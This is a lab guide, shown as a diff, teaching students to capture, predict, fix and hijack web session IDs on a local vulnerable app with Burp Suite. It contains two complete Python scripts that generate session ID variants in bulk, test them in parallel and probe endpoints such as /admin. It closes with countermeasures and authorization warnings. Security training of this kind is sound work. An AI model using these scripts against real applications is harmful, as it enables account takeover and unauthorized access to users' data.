@@ -1,0 +1,638 @@
+Capture and Manipulate Session IDs Across Apps
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the fundamentals of session management and session ID vulnerabilities
+Capture session IDs using Burp Suite Community Edition
+Manually manipulate session IDs to impersonate other users
+Automate session ID interception and manipulation using Python scripts
+Identify and exploit weak session management implementations
+Recognize the security implications of session hijacking attacks
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of HTTP protocol and web application architecture
+Familiarity with web browsers and developer tools
+Basic knowledge of Python programming
+Understanding of authentication and authorization concepts
+Experience with command-line interfaces in Linux environments
+Ready-to-Use Cloud Machines
+Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. No need to build your own virtual machine or install additional software - everything is ready to use.
+
+Lab Environment Setup
+Your cloud machine comes pre-installed with:
+
+Burp Suite Community Edition
+Python 3.x with required libraries
+Firefox web browser
+A vulnerable web application for testing
+All necessary scripts and tools
+Task 1: Capture Session IDs Using Burp Suite
+Subtask 1.1: Launch and Configure Burp Suite
+Open a terminal window and start Burp Suite:
+cd /opt/burpsuite
+java -jar burpsuite_community.jar
+When Burp Suite launches, click Next through the startup wizard and select Start Burp.
+
+Navigate to the Proxy tab and ensure the Intercept is initially turned off.
+
+Configure your browser proxy settings:
+
+Open Firefox
+Go to Settings > Network Settings
+Select Manual proxy configuration
+Set HTTP Proxy to 127.0.0.1 port 8080
+Check Use this proxy server for all protocols
+Click OK
+Subtask 1.2: Set Up the Vulnerable Application
+Start the vulnerable web application server:
+cd /home/student/vulnerable-app
+python3 app.py
+The application will start on http://localhost:3000
+
+Open Firefox and navigate to http://localhost:3000
+
+You should see a simple login page for the VulnApp application.
+
+Subtask 1.3: Capture Initial Session Traffic
+In Burp Suite, go to the Proxy tab and turn Intercept on.
+
+In Firefox, attempt to log in with these credentials:
+
+Username: user1
+Password: password123
+You will see the login request intercepted in Burp Suite. Click Forward to allow it through.
+
+Turn Intercept off and continue browsing the application.
+
+Go to the HTTP history tab in Burp Suite to view all captured requests.
+
+Subtask 1.4: Identify Session ID Patterns
+In the HTTP history, look for requests after successful login.
+
+Examine the Cookie headers in requests and Set-Cookie headers in responses.
+
+Identify the session ID cookie (typically named JSESSIONID, PHPSESSID, or sessionid).
+
+Right-click on a request containing the session cookie and select Send to Repeater.
+
+In the Repeater tab, observe the session ID format and structure.
+
+Example session ID you might see:
+
+Cookie: sessionid=abc123def456ghi789jkl012mno345pqr678
+Task 2: Manipulate Session IDs to Impersonate Users
+Subtask 2.1: Analyze Session ID Characteristics
+Create a new file to document session IDs:
+nano /home/student/session_analysis.txt
+Record multiple session IDs by logging in and out several times:
+
+Log out of the current session
+Log back in and capture the new session ID
+Repeat this process 5 times
+Analyze the patterns:
+
+Length of session IDs
+Character sets used (alphanumeric, special characters)
+Any predictable patterns or sequences
+Subtask 2.2: Attempt Session ID Prediction
+In Burp Suite Repeater, modify the session ID cookie value.
+
+Try systematic approaches:
+
+Increment numeric portions
+Change single characters
+Try common weak session IDs like admin, test, 123456
+Send modified requests and observe responses:
+
+200 OK might indicate successful impersonation
+401 Unauthorized or 403 Forbidden indicates invalid session
+302 Redirect to login page suggests session expired
+Subtask 2.3: Session Fixation Attack
+Before logging in, capture the initial session ID assigned by the application.
+
+Log in with valid credentials while monitoring if the session ID changes.
+
+If the session ID remains the same after login, the application is vulnerable to session fixation.
+
+Test this by:
+
+Getting a session ID before authentication
+Providing this session ID to another user
+Having them authenticate with it
+Checking if you can access their session
+Subtask 2.4: Manual Session Hijacking
+Open a second browser tab in Private/Incognito mode.
+
+In the original tab, log in as user1 and navigate to the profile page.
+
+Copy the session ID from Burp Suite history.
+
+In the incognito tab, navigate to http://localhost:3000/profile (without logging in).
+
+Use browser developer tools to manually set the cookie:
+
+Press F12 to open developer tools
+Go to Console tab
+Execute: document.cookie = "sessionid=CAPTURED_SESSION_ID_HERE"
+Refresh the page and verify if you can access user1's profile without authentication.
+
+Task 3: Automate Session ID Interception and Manipulation with Python
+Subtask 3.1: Create Session Capture Script
+Create a Python script for automated session capture:
+nano /home/student/session_capture.py
+Add the following code:
+#!/usr/bin/env python3
+
+import requests
+import re
+import time
+from urllib.parse import urljoin
+
+class SessionCapture:
+    def __init__(self, base_url):
+        self.base_url = base_url
+        self.session = requests.Session()
+        self.captured_sessions = []
+    
+    def login(self, username, password):
+        """Perform login and capture session ID"""
+        login_url = urljoin(self.base_url, '/login')
+        
+        # Get login page first to capture any initial cookies
+        response = self.session.get(login_url)
+        print(f"Initial cookies: {dict(response.cookies)}")
+        
+        # Perform login
+        login_data = {
+            'username': username,
+            'password': password
+        }
+        
+        response = self.session.post(login_url, data=login_data)
+        
+        if response.status_code == 200 or response.status_code == 302:
+            session_id = self.extract_session_id(response.cookies)
+            if session_id:
+                self.captured_sessions.append({
+                    'username': username,
+                    'session_id': session_id,
+                    'timestamp': time.time()
+                })
+                print(f"Captured session for {username}: {session_id}")
+                return session_id
+        
+        print(f"Login failed for {username}")
+        return None
+    
+    def extract_session_id(self, cookies):
+        """Extract session ID from cookies"""
+        session_names = ['sessionid', 'JSESSIONID', 'PHPSESSID', 'session']
+        
+        for cookie_name in session_names:
+            if cookie_name in cookies:
+                return cookies[cookie_name]
+        
+        return None
+    
+    def test_session_validity(self, session_id):
+        """Test if a session ID is valid"""
+        test_url = urljoin(self.base_url, '/profile')
+        
+        # Create new session with specific cookie
+        test_session = requests.Session()
+        test_session.cookies.set('sessionid', session_id)
+        
+        response = test_session.get(test_url)
+        
+        if response.status_code == 200 and 'profile' in response.text.lower():
+            return True
+        return False
+    
+    def brute_force_sessions(self, base_session_id, max_attempts=100):
+        """Attempt to brute force session IDs"""
+        print(f"Starting brute force attack on session: {base_session_id}")
+        valid_sessions = []
+        
+        # Try numeric incrementation
+        if base_session_id.isdigit():
+            base_num = int(base_session_id)
+            for i in range(max_attempts):
+                test_id = str(base_num + i)
+                if self.test_session_validity(test_id):
+                    valid_sessions.append(test_id)
+                    print(f"Valid session found: {test_id}")
+        
+        # Try character substitution
+        else:
+            for i in range(min(len(base_session_id), max_attempts)):
+                for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
+                    test_id = base_session_id[:i] + char + base_session_id[i+1:]
+                    if test_id != base_session_id and self.test_session_validity(test_id):
+                        valid_sessions.append(test_id)
+                        print(f"Valid session found: {test_id}")
+        
+        return valid_sessions
+
+if __name__ == "__main__":
+    # Initialize session capture
+    app_url = "http://localhost:3000"
+    capture = SessionCapture(app_url)
+    
+    # Test with multiple users
+    users = [
+        ('user1', 'password123'),
+        ('user2', 'password456'),
+        ('admin', 'admin123')
+    ]
+    
+    print("=== Session Capture Phase ===")
+    for username, password in users:
+        capture.login(username, password)
+        time.sleep(1)  # Avoid overwhelming the server
+    
+    print(f"\nCaptured {len(capture.captured_sessions)} sessions:")
+    for session_info in capture.captured_sessions:
+        print(f"User: {session_info['username']}, Session: {session_info['session_id']}")
+    
+    # Attempt brute force on first captured session
+    if capture.captured_sessions:
+        first_session = capture.captured_sessions[0]['session_id']
+        print(f"\n=== Brute Force Phase ===")
+        valid_sessions = capture.brute_force_sessions(first_session, 50)
+        print(f"Found {len(valid_sessions)} additional valid sessions")
+Make the script executable:
+chmod +x /home/student/session_capture.py
+Subtask 3.2: Create Session Manipulation Script
+Create an advanced session manipulation script:
+nano /home/student/session_manipulator.py
+Add the following code:
+#!/usr/bin/env python3
+
+import requests
+import hashlib
+import itertools
+import string
+import time
+from concurrent.futures import ThreadPoolExecutor
+import json
+
+class SessionManipulator:
+    def __init__(self, base_url, proxy=None):
+        self.base_url = base_url
+        self.proxy = proxy
+        self.session = requests.Session()
+        if proxy:
+            self.session.proxies.update(proxy)
+    
+    def generate_session_variants(self, original_session, max_variants=1000):
+        """Generate potential session ID variants"""
+        variants = set()
+        
+        # Original session
+        variants.add(original_session)
+        
+        # Increment/decrement if numeric parts exist
+        for i, char in enumerate(original_session):
+            if char.isdigit():
+                # Increment
+                new_char = str((int(char) + 1) % 10)
+                variant = original_session[:i] + new_char + original_session[i+1:]
+                variants.add(variant)
+                
+                # Decrement
+                new_char = str((int(char) - 1) % 10)
+                variant = original_session[:i] + new_char + original_session[i+1:]
+                variants.add(variant)
+        
+        # Character substitution
+        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+        for i in range(min(len(original_session), 10)):  # Limit to avoid too many variants
+            for char in charset[:10]:  # Limit character set
+                if len(variants) >= max_variants:
+                    break
+                variant = original_session[:i] + char + original_session[i+1:]
+                variants.add(variant)
+        
+        # Common weak session patterns
+        weak_patterns = [
+            'admin', 'test', 'user', 'guest', 'demo',
+            '123456', 'password', 'session', 'cookie',
+            '000000', '111111', 'aaaaaa', 'abcdef'
+        ]
+        
+        for pattern in weak_patterns:
+            variants.add(pattern)
+            # Pad to original length if needed
+            if len(pattern) < len(original_session):
+                padded = pattern + '0' * (len(original_session) - len(pattern))
+                variants.add(padded)
+        
+        return list(variants)[:max_variants]
+    
+    def test_session_access(self, session_id, endpoint='/profile'):
+        """Test session access to specific endpoint"""
+        try:
+            test_session = requests.Session()
+            if self.proxy:
+                test_session.proxies.update(self.proxy)
+            
+            # Set the session cookie
+            test_session.cookies.set('sessionid', session_id)
+            
+            # Test access
+            response = test_session.get(self.base_url + endpoint, timeout=5)
+            
+            # Analyze response
+            result = {
+                'session_id': session_id,
+                'status_code': response.status_code,
+                'valid': False,
+                'user_info': None,
+                'response_length': len(response.text)
+            }
+            
+            # Check for successful access indicators
+            if response.status_code == 200:
+                # Look for user-specific content
+                if any(keyword in response.text.lower() for keyword in ['welcome', 'profile', 'dashboard', 'user']):
+                    result['valid'] = True
+                    
+                    # Try to extract user information
+                    import re
+                    user_match = re.search(r'welcome[,\s]+([a-zA-Z0-9_]+)', response.text, re.IGNORECASE)
+                    if user_match:
+                        result['user_info'] = user_match.group(1)
+            
+            return result
+            
+        except Exception as e:
+            return {
+                'session_id': session_id,
+                'status_code': 0,
+                'valid': False,
+                'error': str(e),
+                'response_length': 0
+            }
+    
+    def parallel_session_test(self, session_variants, max_workers=10):
+        """Test multiple sessions in parallel"""
+        print(f"Testing {len(session_variants)} session variants...")
+        
+        valid_sessions = []
+        
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            # Submit all tasks
+            future_to_session = {
+                executor.submit(self.test_session_access, session_id): session_id 
+                for session_id in session_variants
+            }
+            
+            # Process results
+            for future in future_to_session:
+                result = future.result()
+                if result['valid']:
+                    valid_sessions.append(result)
+                    print(f"Valid session found: {result['session_id']}")
+                    if result['user_info']:
+                        print(f"  -> User: {result['user_info']}")
+        
+        return valid_sessions
+    
+    def session_hijack_demo(self, target_session_id):
+        """Demonstrate session hijacking"""
+        print(f"Attempting to hijack session: {target_session_id}")
+        
+        # Test original session
+        result = self.test_session_access(target_session_id)
+        
+        if result['valid']:
+            print("Session hijacking successful!")
+            print(f"Status Code: {result['status_code']}")
+            print(f"Response Length: {result['response_length']}")
+            if result['user_info']:
+                print(f"Compromised User: {result['user_info']}")
+            
+            # Try to access sensitive endpoints
+            sensitive_endpoints = ['/profile', '/settings', '/admin', '/dashboard']
+            
+            for endpoint in sensitive_endpoints:
+                endpoint_result = self.test_session_access(target_session_id, endpoint)
+                if endpoint_result['valid']:
+                    print(f"Access granted to: {endpoint}")
+                else:
+                    print(f"Access denied to: {endpoint}")
+        else:
+            print("Session hijacking failed - invalid session ID")
+    
+    def save_results(self, results, filename='session_results.json'):
+        """Save results to file"""
+        with open(filename, 'w') as f:
+            json.dump(results, f, indent=2)
+        print(f"Results saved to {filename}")
+
+if __name__ == "__main__":
+    # Configuration
+    app_url = "http://localhost:3000"
+    proxy_config = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+    
+    # Initialize manipulator
+    manipulator = SessionManipulator(app_url, proxy_config)
+    
+    # Example session ID (replace with captured session)
+    original_session = input("Enter captured session ID: ").strip()
+    
+    if original_session:
+        print(f"Starting manipulation of session: {original_session}")
+        
+        # Generate variants
+        variants = manipulator.generate_session_variants(original_session, 500)
+        print(f"Generated {len(variants)} session variants")
+        
+        # Test variants
+        valid_sessions = manipulator.parallel_session_test(variants, max_workers=5)
+        
+        print(f"\n=== Results ===")
+        print(f"Valid sessions found: {len(valid_sessions)}")
+        
+        for session in valid_sessions:
+            print(f"Session: {session['session_id']}")
+            if session['user_info']:
+                print(f"  User: {session['user_info']}")
+            print(f"  Status: {session['status_code']}")
+        
+        # Save results
+        manipulator.save_results(valid_sessions)
+        
+        # Demonstrate hijacking with first valid session
+        if valid_sessions:
+            print(f"\n=== Hijacking Demo ===")
+            manipulator.session_hijack_demo(valid_sessions[0]['session_id'])
+    else:
+        print("No session ID provided")
+Make the script executable:
+chmod +x /home/student/session_manipulator.py
+Subtask 3.3: Run Automated Session Attacks
+First, ensure the vulnerable application is running:
+cd /home/student/vulnerable-app
+python3 app.py &
+Run the session capture script:
+cd /home/student
+python3 session_capture.py
+Copy one of the captured session IDs from the output.
+
+Run the session manipulation script:
+
+python3 session_manipulator.py
+When prompted, paste the captured session ID.
+
+Monitor the output for valid sessions found through manipulation.
+
+Subtask 3.4: Analyze Automation Results
+Review the generated session_results.json file:
+cat session_results.json | python3 -m json.tool
+Create a summary report:
+nano /home/student/session_attack_report.txt
+Document your findings:
+Number of sessions captured
+Success rate of session manipulation
+Types of vulnerabilities discovered
+Potential impact of successful attacks
+Advanced Techniques and Countermeasures
+Session ID Analysis Techniques
+Entropy Analysis: Create a script to measure session ID randomness:
+import math
+from collections import Counter
+
+def calculate_entropy(session_id):
+    """Calculate Shannon entropy of session ID"""
+    if not session_id:
+        return 0
+    
+    # Count character frequencies
+    char_counts = Counter(session_id)
+    length = len(session_id)
+    
+    # Calculate entropy
+    entropy = 0
+    for count in char_counts.values():
+        probability = count / length
+        entropy -= probability * math.log2(probability)
+    
+    return entropy
+
+# Test with captured session IDs
+session_ids = [
+    "abc123def456",  # Low entropy
+    "x7k9m2p8q1w5",  # Higher entropy
+    "123456789012"   # Very low entropy
+]
+
+for sid in session_ids:
+    entropy = calculate_entropy(sid)
+    print(f"Session: {sid}, Entropy: {entropy:.2f}")
+Pattern Recognition: Look for predictable patterns in session generation.
+Security Countermeasures
+Understanding these attacks helps implement proper defenses:
+
+Secure Session Generation:
+
+Use cryptographically secure random number generators
+Ensure sufficient entropy (minimum 128 bits)
+Implement session rotation after authentication
+Session Protection:
+
+Use HTTPS only for session cookies
+Implement proper session timeout
+Bind sessions to IP addresses when appropriate
+Use secure cookie flags (HttpOnly, Secure, SameSite)
+Monitoring and Detection:
+
+Log session creation and usage patterns
+Detect unusual session access patterns
+Implement session concurrency limits
+Troubleshooting Common Issues
+Issue 1: Burp Suite Not Intercepting Traffic
+Solution:
+
+# Check if Burp is running on correct port
+netstat -tlnp | grep 8080
+
+# Verify browser proxy settings
+firefox about:preferences#general
+Issue 2: Python Scripts Failing
+Solution:
+
+# Install required Python packages
+pip3 install requests
+
+# Check Python version
+python3 --version
+
+# Run with verbose output
+python3 -v session_capture.py
+Issue 3: Vulnerable Application Not Starting
+Solution:
+
+# Check if port 3000 is available
+netstat -tlnp | grep 3000
+
+# Kill any existing processes
+pkill -f "python3 app.py"
+
+# Restart the application
+cd /home/student/vulnerable-app
+python3 app.py
+Issue 4: Session IDs Not Being Captured
+Solution:
+
+Ensure cookies are enabled in browser
+Check if application uses different cookie names
+Verify network connectivity between browser and application
+Clear browser cache and cookies before testing
+Lab Validation and Testing
+Validation Checklist
+Session Capture Validation:
+
+ Successfully intercepted login requests in Burp Suite
+ Identified session ID cookies in HTTP traffic
+ Captured multiple different session IDs
+Manual Manipulation Validation:
+
+ Modified session IDs in Burp Suite Repeater
+ Tested session ID prediction techniques
+ Successfully accessed unauthorized content
+Automation Validation:
+
+ Python scripts executed without errors
+ Generated session ID variants automatically
+ Identified valid sessions through brute force
+ Documented results in JSON format
+Performance Metrics
+Track these metrics during your lab:
+
+Session Capture Rate: Number of sessions captured per minute
+Manipulation Success Rate: Percentage of successful session hijacks
+False Positive Rate: Invalid sessions incorrectly identified as valid
+Detection Evasion: Ability to avoid triggering security alerts
+Conclusion
+In this comprehensive lab, you have successfully learned to capture and manipulate session IDs across web applications using both manual and automated techniques. You have gained hands-on experience with:
+
+Key Accomplishments:
+
+Session ID Interception: Used Burp Suite to capture session identifiers from HTTP traffic
+Manual Manipulation: Modified session IDs to impersonate other users and access unauthorized content
+Automated Attacks: Developed Python scripts to systematically test session ID vulnerabilities
+Pattern Analysis: Identified weaknesses in session generation algorithms
+Security Assessment: Evaluated the security posture of session management implementations
+Why This Matters: Session hijacking represents one of the most critical web application security vulnerabilities. Understanding these attack vectors is essential for:
+
+Security Professionals: Identifying and mitigating session management flaws
+Developers: Implementing secure session handling mechanisms
+Penetration Testers: Conducting thorough security assessments
+System Administrators: Monitoring and detecting session-based attacks
+Real-World Impact: The techniques learned in this lab directly apply to real-world security scenarios where attackers attempt to compromise user sessions to gain unauthorized access to sensitive data and functionality. By understanding these attack methods, security professionals can better defend against them and implement appropriate countermeasures.
+
+Next Steps: Continue your learning journey by exploring advanced session security topics such as JSON Web Tokens (JWT), OAuth implementations, and modern session management frameworks. Practice these techniques in controlled environments and always ensure you have proper authorization before testing on any systems.
+
+Remember: The knowledge gained from this lab should only be used for legitimate security testing and educational purposes. Always follow responsible disclosure practices and obtain proper authorization before conducting security assessments.
